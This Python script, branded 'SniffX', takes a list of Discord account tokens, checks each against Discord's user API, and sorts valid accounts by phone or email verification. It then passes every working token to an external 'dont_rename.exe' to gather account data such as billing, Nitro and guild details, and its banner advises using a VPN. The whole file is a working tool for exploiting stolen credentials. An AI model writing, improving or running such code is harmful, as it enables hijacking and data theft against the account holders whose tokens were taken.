# -*- coding: utf-8 -*-
import subprocess
import sys
import ctypes
import requests
import os
from pathlib import Path
from datetime import datetime
from colorama import Fore, init
import threading
def title(content):
    ctypes.windll.kernel32.SetConsoleTitleW(content)
def fileSetup():        
    now = datetime.now()
    folder = f"{cwd}\\{now.strftime('%Y-%m-%d %H-%M-%S')}"
    os.makedirs(folder + "\\tokenData")
    os.makedirs(folder + "\\bestTokens")
    open(folder + "\\bestTokens\\billing.txt", "x")
    open(folder + "\\bestTokens\\nitro.txt", "x")
    open(folder + "\\bestTokens\\guilds.txt", "x")
    return folder
def get_id():
    if 'nt' in os.name: 
        p = subprocess.Popen("wmic csproduct get uuid", shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE) 
        return (p.stdout.read() + p.stderr.read()).decode().split("\n")[1].strip("  \r\r")
    else:
        return subprocess.Popen('hal-get-property --udi /org/freedesktop/Hal/devices/computer --key system.hardware.uuid'.split())
init(autoreset=True)
red = Fore.LIGHTMAGENTA_EX
blue = Fore.LIGHTMAGENTA_EX
green = Fore.LIGHTMAGENTA_EX
yellow = Fore.LIGHTMAGENTA_EX
dgreen = Fore.LIGHTMAGENTA_EX
white = Fore.RESET
gray = Fore.LIGHTBLACK_EX
import time
title("[SniffX | chasa.wtf] Loading...")
cwd = os.getcwd()
os.system('cls') 
print(f"""{blue}
                ___   ___            
            _ / ___)/ ___)           
  ___  ___ (_) (__ | (__    __  _ __ 
/  __)  _  \ |  __)|  __) / __ \  __)
\__  \ ( ) | | |   | |   (  ___/ |   
(____/_) (_)_)_)   (_)    \____)_)

Made by Chasa | Visit chasa.wtf for more tools.

{gray}[{blue}!{gray}]{white} Make sure to use a vpn!
 """)

while True:
    print(f"{gray}[{blue}/{gray}]{white} Members Threshold for bestTokens/guilds.txt? (number): ", end='')
    threshold = input()
    try:
        threshold = int(threshold)
    except:
        print(f"{gray}[{red}!{gray}]{white} Not an number.")
    else:
        print(f"{gray}[{blue}:{gray}]{white} Members Threshold: {green}{threshold}")
        break
print(f"{gray}[{blue}/{gray}]{white} Press ENTER to start sniffing.", end="")
input()
title("[SniffX | chasa.wtf] Loading Tokens...")

try:
    with open("tokens.txt", "r") as f:
        tokens = [x.strip() for x in f.readlines()]
    if tokens == []:
        title("[SniffX | chasa.wtf] !! No Tokens Found !!")
        print(f"{gray}[{red}!{gray}]{white} 'tokens.txt' is empty. Enter tokens into file and restart.")
        print(f"{gray}[{yellow}!{gray}]{white} Press ENTER to exit.")
        input()
        sys.exit()
    tokens_before = tokens
    tokens = list(dict.fromkeys(tokens))
    title("[SniffX | chasa.wtf] Loaded Tokens")
    print(f"{gray}[{green}+{gray}]{white} Loaded {len(tokens)} from 'tokens.txt'. {gray}({len(tokens_before) - len(tokens)} dupes removed)")
except FileNotFoundError:
    print(f"{gray}[{red}!{gray}]{white} File 'tokens.txt' does not exist.")
    f = open("tokens.txt", "x")
    f.close()
    print(f"{gray}[{green}+{gray}]{white} Created 'tokens.txt'. Enter tokens into file and restart.")
    print(f"{gray}[{yellow}!{gray}]{white} Press ENTER to exit.")
    input()
    sys.exit()
except Exception as e:
    print(f"{gray}[{red}!{gray}]{white} An unexpected error has occoured.")
    print(f"{gray}[{yellow}!{gray}]{white} Debug info: {e}")
    print(f"{gray}[{yellow}!{gray}]{white} Press ENTER to exit.")
    input()
    sys.exit()

working_tokens = []
dup_ids = []
phone = []
email = []
invalid = 0
duplicate = 0
error = 0
rate_limit = 0
def checker(tokenz):
    global invalid
    global duplicate
    global error
    global rate_limit
    global phone
    global email
    for token in tokenz:
        headers = { 
            "Content-Type": "application/json", 
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36",
            "Authorization": token
        }
        try:
            req = requests.get("https://discord.com/api/users/@me", headers=headers)
            if req.status_code == 200:
                userData = req.json()
                if userData['id'] not in dup_ids:
                    dup_ids.append(userData["id"])
                    working_tokens.append(token)
                    if userData['phone'] != None:
                        phone.append(token)
                    elif userData['verified'] == True:
                        email.append(token)
                else:
                    duplicate += 1
            elif("You are being rate limited." in req.text):
                print(f"{gray}[{red}-{gray}]{white} Rate Limited.")
                rate_limit += 1
            else:
                invalid += 1
        except Exception as e:
            print(f"{gray}[{red}-{gray}]{white} Error. (Debug: {e})")
            error += 1
        else:
            pass
        title(f"[SniffX | chasa.wtf] Checked: {len(working_tokens) + invalid + duplicate + error}/{len(tokens)} // Valid: {len(working_tokens)} - Email: {len(email)} - Phone: {len(phone)} // Invalid: {invalid} // Duplicate: {duplicate} // Rate Limit: {rate_limit} // Error: {error}")

def chunks(l, n):
    n = max(1, n)
    return (l[i:i+n] for i in range(0, len(l), n))

threads = []
for x in chunks(tokens, 5):
    t = threading.Thread(target=checker, args=(x,))
    t.start()
    threads.append(t)

for t in threads:
    t.join()

print(f"{gray}[{blue}:{gray}]{white} Sniffing {len(working_tokens)} token(s).")

if len(working_tokens) > 0:
    folder = fileSetup()
    f = open(f"{folder}\\working.txt", "w")
    for x in working_tokens:
        f.write(f"{x}\n")
    f.close()
if len(email) > 0:
    f = open(f"{folder}\\verified_email.txt", "a")
    for x in email:
        f.write(f"{x}\n")
    f.close()
if len(phone) > 0:
    f = open(f"{folder}\\verified_phone.txt", "a")
    for x in phone:
        f.write(f"{x}\n")
    f.close()

done = 0
title(f"[SniffX | chasa.wtf] Sniffing // Completed: {done}")
open(folder + "\\all_data.txt", "x").close()
f = open(folder + "\\all_data.json", "w")
f.write("[\n")
f.close()

def sniff(tokens):
    global done
    for token in tokens:
        try:
            subprocess.call(f'dont_rename.exe {token} "{folder}" N {threshold}', shell=True)
        except:
            pass
        done += 1
        title(f"[SniffX | chasa.wtf] Sniffing // Completed: {done}/{len(working_tokens)}")

threads = []
for x in chunks(working_tokens, 13):
    t = threading.Thread(target=sniff, args=(x,))
    t.start()
    threads.append(t)

for t in threads:
    t.join()

f = open(folder + "\\all_data.json", "a")
f.write("]")
f.close()

title("[SniffX | chasa.wtf] Completed.")
print(f"{gray}[{green}+{gray}]{white} Completed all tokens. Press ENTER to exit.")
input()
